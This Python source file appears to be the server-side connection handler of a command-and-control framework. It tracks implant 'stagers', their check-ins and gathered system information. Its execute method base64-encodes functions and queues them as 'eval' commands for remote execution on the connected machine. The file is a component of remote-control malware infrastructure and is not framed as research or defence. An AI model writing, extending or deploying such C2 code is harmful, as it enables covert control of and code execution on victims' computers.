import base64
import time

from connect import cli, color, loader, time, util

class Connection():

    def __init__(self, stager_format):
        self.command_queue = []
        self.connection_cli = None
        self.stager_format = stager_format
        self.stager_requested = self.get_current_time()
        self.last_checkin = self.get_current_time()
        self.loaded_functions = []
        self.menu_options = {}
        self.status = 'pending'
        self.system_information = {}

    def __str__(self):
        internet_addr = self.system_information['ip']
        return f'{internet_addr} is {self.status} and last checked in at {self.last_checkin}.'

    def check_in(self):
        self.status = 'connected'
        self.last_checkin = self.get_current_time()
        return 0

    def discover_options(self, file_name):
        if len(file_name) > 1:
            file_name = file_name[1]
            loader.discover_functions(file_name)
        for function in util.functions:
            if function.format == self.stager_format:
                self.menu_options[function.name] = util.MenuOption(self.execute, f'{function.description} (unloaded).', 'Connection Options', color.unloaded, True)
        self.update_options()
        return 0

    def execute(self, option):
        option = option[0]
        if option not in self.loaded_functions:
            for function in util.functions:
                if function.name == option:
                    function_definiton = str(base64.b64encode(function.definiton.encode('utf-8')), 'utf-8')
                    self.menu_options[option] = util.MenuOption(self.execute, f'{function.description}.', 'Connection Options', color.normal, True)
                    self.command_queue.append('{' + '"eval":' + f'"{function_definiton}"' + '}')
                    self.loaded_functions.append(option)
                    self.connection_cli.update_options(self.menu_options)
        option = f'{option}()'
        option = str(base64.b64encode(option.encode('utf-8')), 'utf-8')
        self.command_queue.append('{' + '"eval":' + f'"{option}"' + '}')
        return 0

    def information(self):
        color.header('System Information')
        for key, value in self.system_information.items():
            color.normal(f'{key} : {value}')
        color.normal('')
        return 0

    def interact(self):
        self.discover_options([''])
        self.menu_options['discover'] = util.MenuOption(self.discover_options, 'Discovers new options from provided files within the extensions directory. (e.g., discover stdlib.jscript)', 'Conneciton Options', color.normal, True)
        self.menu_options['information'] = util.MenuOption(self.information, 'Displays gatherd system information.', 'Connection Options', color.normal, False)
        internet_addr = self.system_information['ip']
        self.connection_cli = cli.CommandLine(f'connection ({internet_addr}) :')
        self.update_options()
        self.connection_cli.run()
        return 0

    def update_options(self):
        #todo: Hackish-way to handle when to update connection_cli options.
        if self.connection_cli:
            self.connection_cli.update_options(self.menu_options)
        return 0

    @staticmethod
    def get_current_time():
        return time.strftime("%H:%M:%S", time.localtime())
